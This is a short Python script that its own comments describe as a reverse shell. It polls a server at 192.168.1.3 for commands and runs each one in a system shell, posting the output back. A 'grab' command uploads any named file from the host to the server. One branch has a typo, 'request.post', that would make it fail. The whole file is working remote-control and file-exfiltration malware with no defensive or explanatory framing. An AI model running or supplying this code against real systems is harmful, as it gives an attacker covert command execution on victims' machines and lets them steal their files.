import requests
import subprocess
import time
import os

while True:

	req = requests.get("http://192.168.1.3") #IP Address of the server
	command = req.text

	if "terminate" in command: #Terminate the reverse shell
		break
	elif "grab" in command: #Send a file to the server
		grab, path = command.split("*")

		if os.path.exists(path):
			url = "http://192.168.1.3/store"
			files = {"file": open(path, "r")}
			r = requests.post(url, files = files)
		else:
			post_response = request.post(url = "http://192.168.1.3", data = "[-] Not able to find the file!")
	else:
		CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		post_response = requests.post(url = "http://192.168.1.3", data = CMD.stdout.read())
		post_response = requests.post(url = "http://192.168.1.3", data = CMD.stderr.read())

	time.sleep(3)
